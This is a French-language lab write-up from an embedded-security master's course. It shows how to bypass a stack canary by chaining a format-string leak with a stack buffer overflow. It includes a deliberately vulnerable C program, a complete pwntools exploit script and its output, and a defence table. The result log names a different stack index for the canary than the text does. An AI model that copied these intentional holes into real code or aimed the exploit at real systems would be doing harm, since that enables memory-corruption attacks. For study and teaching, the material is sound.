# Write-up — Lab 08 : Stack Canary Bypass

> **Pilier 3 — Embarqué / C-ASM x86-64**
> Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · 2026

[![Canary Bypass](https://img.shields.io/badge/Canary-Bypassed-red.svg)]()
[![Format String](https://img.shields.io/badge/technique-Format%20String%20Leak-orange.svg)]()
[![pwntools](https://img.shields.io/badge/pwntools-fmtstr-blue.svg)]()
[![Solved](https://img.shields.io/badge/Lab-Solved-brightgreen.svg)]()

---

## 1. TL;DR

**Contexte :** Stack canary actif — toute corruption de pile déclenche SIGABRT  
**Technique :** 2 étapes — leak canary via format string → overflow en préservant le canary  
**Preuve canary :** valeur différente à chaque run (ex: `0x93d8da2f08e5eb00`)  
**Résultat :** FLAG imprimé — `AngeVirus{stack_canary_bypassed}`

---

## 2. Environnement

```text
OS     : WSL2 Ubuntu — Linux 6.6
gcc    : -g -fstack-protector-strong -no-pie
ASLR   : actif
```

**checksec :**

```
Stack:  Canary found        ← protection active
NX:     NX enabled
PIE:    No PIE (0x400000)   ← adresses binaire fixes
```

---

## 3. Qu'est-ce que le stack canary ?

Le compilateur insère une valeur aléatoire (**canary**) entre le buffer et l'adresse de retour. Avant de retourner d'une fonction, il vérifie que le canary n'a pas été modifié. Si oui → `__stack_chk_fail()` → SIGABRT.

```
┌──────────────────────┐  ← RSP
│   buffer[64]         │
│   padding[8]         │
│   canary[8]  ←───────┼── valeur aléatoire, dernier octet = 0x00
│   saved RBP[8]       │
│   return addr[8]     │  ← RIP
└──────────────────────┘  ← RBP
```

Le canary a toujours `0x00` comme octet de poids faible — conçu pour bloquer les overflows via `strcpy` (s'arrête au null byte). Mais `read()` n'a pas cette limitation.

---

## 4. Code vulnérable — `target.c`

```c
#include <stdio.h>
#include <unistd.h>

void win() {
    printf(">>> FLAG : AngeVirus{stack_canary_bypassed} <<<\n");
}

void vulnerable() {
    char buffer[64];

    // Stage 1 : format string → leak canary
    printf("Leak     : ");
    fflush(stdout);
    read(0, buffer, 64);
    printf(buffer);           // VULNERABLE : format string

    // Stage 2 : overflow avec canary connu
    printf("Overflow : ");
    fflush(stdout);
    read(0, buffer, 200);     // overflow volontaire
}

int main() {
    vulnerable();
    return 0;
}
```

**Deux vulnérabilités combinées :**
1. `printf(buffer)` sans format string → fuite de la pile (format string)
2. `read(0, buffer, 200)` dans `buffer[64]` → overflow classique

---

## 5. Stratégie en 2 étapes

```
┌─────────────────────────────────────────────────────────┐
│  STAGE 1 — Format string leak                           │
│                                                         │
│  Envoie : %11$p.%12$p...%20$p                          │
│  Le programme affiche 10 valeurs de la pile             │
│  Identifier le canary : seule valeur 64-bit             │
│  se terminant par 00 et > 0x100000000                   │
└─────────────────────────────────────────────────────────┘
              │
              ▼  canary connu → peut être reproduit dans le payload
┌─────────────────────────────────────────────────────────┐
│  STAGE 2 — Overflow avec canary préservé                │
│                                                         │
│  [A × 72] [canary] [B × 8] [win()]                     │
│  Le canary check passe → RIP redirigé → FLAG            │
└─────────────────────────────────────────────────────────┘
```

---

## 6. Découverte de l'offset canary

Dump de pile (probe indices 11-20) :

```
Index 11 : 0x2e70243831252e70  ← fin du buffer (format string)
Index 12 : 0x32252e7024393125  ← fin du buffer
Index 13 : 0xa702430           ← dernier qword buffer + \n
Index 14 : (nil)               ← padding 8 bytes
Index 15 : 0x93d8da2f08e5eb00  ← CANARY (finit par 00 ✓)
Index 16 : 0x7ffea7eb0cd0      ← saved RBP
Index 17 : 0x4012a6            ← return address
```

**Layout pile confirmé :**
- buffer : 64 bytes (indices 6-13)
- padding : 8 bytes (index 14 = nil)
- canary : 8 bytes (index 15)
- saved RBP : 8 bytes
- return address : 8 bytes

Offset total avant canary = **72 bytes** (64 + 8 padding).

---

## 7. Exploit — `exploit.py`

```python
from pwn import *

elf = ELF('./target')
context.binary = elf
context.log_level = 'info'

p = process('./target')

# ── STAGE 1 : Format string → leak canary ──
p.recvuntil(b'Leak     : ')

# Probe indices 11-20 (59 bytes < limite 64)
probe = b'.'.join(f'%{i}$p'.encode() for i in range(11, 21))
p.send(probe + b'\n')

leak_raw = p.recvuntil(b'Overflow : ')
leak_data = leak_raw[:-len(b'Overflow : ')].strip()

values = leak_data.split(b'.')
canary = None
for i, val in enumerate(values):
    val = val.strip()
    if val.startswith(b'0x') and val.endswith(b'00'):
        num = int(val, 16)
        if num > 0x100000000:
            canary = num
            log.success(f"Canary @ %{i+11}$p : {hex(canary)}")
            break

# ── STAGE 2 : Overflow avec canary préservé ──
win_addr = elf.sym['win']

# [buffer 64] [padding 8] [canary 8] [saved rbp 8] [RIP 8]
payload = b'A' * 72 + p64(canary) + b'B' * 8 + p64(win_addr)
p.send(payload)

output = p.recvall(timeout=2)
log.success(output.decode(errors='replace'))
```

---

## 8. Résultat

```
[*] Stack dump : ...0xa702430.(nil).0x93d8da2f08e5eb00.0x7ffea7eb0cd0.0x4012a6...
[+] Canary trouve a %5$p : 0x93d8da2f08e5eb00
[+] win() @ 0x4011b6
[+] >>> FLAG : AngeVirus{stack_canary_bypassed} <<<
```

> Screenshot : [docs/lab08_canary_bypass.png](docs/lab08_canary_bypass.png)

---

## 9. Progression des protections

| Lab | Technique | NX | Canary | PIE | ASLR |
| --- | --- | --- | --- | --- | --- |
| 02 | ret2win manuel | Off | Off | Off | Off |
| 03 | ret2win pwntools | Off | Off | Off | Off |
| 04 | Format String | On | Off | Off | Off |
| 05 | ROP ret2libc | On | Off | Off | Off |
| 06 | ret2plt + ret2libc | On | Off | Off | On |
| 07 | PIE leak + ret2libc | On | Off | On | On |
| **08** | **Canary leak + overflow** | **On** | **On** | **Off** | **On** |

---

## 10. Défense

| Vecteur | Mesure |
| --- | --- |
| Format string leak | Ne jamais passer un buffer utilisateur directement à printf — utiliser `printf("%s", buffer)` |
| Canary leak via format string | **Full RELRO** + éviter toute exposition de sortie vers l'attaquant |
| Overflow après leak | `read(0, buf, sizeof(buf))` — limiter la taille |
| Canary bypass | Canary seul insuffisant si une fuite existe — combiner avec **PIE + ASLR** |

---

## Résumé technique

| Élément | Valeur |
| --- | --- |
| Vulnérabilité 1 | Format string — `printf(buffer)` |
| Vulnérabilité 2 | Stack buffer overflow — `read(0, buf, 200)` dans buf[64] |
| Offset canary | 72 bytes (64 buffer + 8 padding) |
| Canary identifier | Valeur 64-bit se terminant par `00`, > 0x100000000 |
| Protection contournée | Stack canary |
| Résultat | FLAG : `AngeVirus{stack_canary_bypassed}` |

---

*Ngagne Demba Dia · AngeVirusLab · Master Sécurité des Systèmes Embarqués · UCAD · Dakar, 2026*
